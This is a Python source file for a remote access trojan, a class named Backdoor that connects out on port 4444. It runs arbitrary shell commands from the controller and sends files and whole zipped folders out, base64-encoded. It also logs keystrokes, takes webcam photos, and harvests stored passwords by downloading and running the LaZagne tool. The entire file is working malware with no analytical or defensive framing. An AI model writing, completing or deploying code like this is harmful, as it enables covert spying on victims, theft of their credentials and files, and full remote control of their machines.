import socket
import json
import subprocess
import base64
import os
from pynput.keyboard import Key, Listener
import logging, threading
import requests
import tempfile
import zipfile
import time
import cv2

class Backdoor:
    def __init__(self, ip, port):
        try:
            self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.conn.connect((ip, port))
        except Exception as e:
            print(f"[+] Socket connection failed! Error: {str(e)}")

    def receive(self):
        json_result = ""
        while True:
            try:
                json_result += self.conn.recv(1024).decode()
                return json.loads(json_result)
            except ValueError:
                continue

    def send(self, data):
        if isinstance(data, bytes):
            data = data.decode()
        json_data = json.dumps(data)
        self.conn.send(json_data.encode())

    def execute_remote_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except Exception:
            return b"[-] Failed to execute command!"

    def change_working_dir(self, command):
        try:
            path = command.split(" ", 1)[1]
            os.chdir(path)
            return b"[+] Directory changed!"
        except Exception:
            return b"[-] Failed to change directory!"

    def download_file(self, path):
        try:
            if os.path.isfile(path):
                with open(path, "rb") as file:
                    return base64.b64encode(file.read()).decode()
            elif os.path.isdir(path):
                temp_zip = tempfile.NamedTemporaryFile(delete=False)
                zip_file = zipfile.ZipFile(temp_zip, 'w', zipfile.ZIP_DEFLATED)
                for root, _, files in os.walk(path):
                    for file in files:
                        zip_file.write(os.path.join(root, file), 
                                    os.path.relpath(os.path.join(root, file), os.path.join(path, '..')))
                zip_file.close()
                temp_zip.close()
                with open(temp_zip.name, "rb") as file:
                    content = base64.b64encode(file.read()).decode()
                os.unlink(temp_zip.name)
                return f"FOLDER:{os.path.basename(path)}:" + content
            else:
                return "[-] Path is neither a file nor a directory!"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def upload_file(self, path, content):
        if content.startswith("[-]"):
            return content.encode()
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return b"[+] File uploaded successfully!"
        except Exception:
            return b"[-] File write error"

    def keyscan_start(self):
        logging.basicConfig(
            filename=("keylog.txt"),
            level=logging.DEBUG,
            format="%(asctime)s %(message)s",
        )
        self.keylogging = True

        def on_press(key):
            if self.keylogging:
                logging.info(str(key))

        with Listener(on_press=on_press) as listener:
            listener.join()

    def keyscan_stop(self):
        self.keylogging = False
        logging.shutdown()

    def keyscan_dump(self):
        self.keyscan_stop()
        result = self.download_file("keylog.txt")
        return result

    def creds_dump(self):
        url = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe"
        content = requests.get(url).content
        pwd = os.getcwd()
        os.chdir(tempfile.gettempdir())
        with open("lazagne.exe", "wb") as file:
            file.write(content)

        result = subprocess.check_output("lazagne.exe all")
        os.remove("lazagne.exe")
        os.chdir(pwd)
        return result
    
    def capture_image(self, n, t):
        images = []
        cam = cv2.VideoCapture(0)
        for i in range(n):
            result, image = cam.read()
            if result:
                _, img_encoded = cv2.imencode('.png', image)
                images.append(base64.b64encode(img_encoded).decode())
            else:
                print("No image detected")
            if i < n - 1:
                time.sleep(t)
        cam.release()
        return images
    
    def run(self):
        while True:
            try:
                data = self.receive()
                command = data.split(" ", 1)

                if command[0] == "cd":
                    result = self.change_working_dir(data)
                elif command[0] == "get":
                    path = data.split(" ", 1)[1]
                    result = self.download_file(path)
                elif command[0] == "upload":
                    path_content = data.split(" ", 2)
                    path = path_content[1]
                    content = path_content[2]
                    result = self.upload_file(path, content)
                elif command[0] == "keyscan_start":
                    result = "[+] Keyscan started!"
                    t = threading.Thread(target=self.keyscan_start, daemon=True)
                    t.start()
                elif command[0] == "keyscan_dump":
                    result = self.keyscan_dump()
                elif command[0] == "creds_dump":
                    result = self.creds_dump()
                elif command[0] == "capture_image":
                    parts = data.split(" ")
                    n = int(parts[1])
                    t = int(parts[2])
                    result = self.capture_image(n, t)
                    self.send(result)
                    continue
                elif command[0] == "exit":
                    self.conn.close()
                    exit(0)
                else:
                    result = self.execute_remote_command(data)

                self.send(result)

            except KeyboardInterrupt:
                exit(0)
            except Exception as e:
                self.send(f"[-] Error: {str(e)}")
            
            
def get_ip_address():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip_address = s.getsockname()[0]
    except Exception as e:
        print(f"Error: {e}")
        ip_address = None
    finally:
        s.close()
    
    return ip_address

ip = get_ip_address()

backdoor = Backdoor(ip, 4444)
backdoor.run()

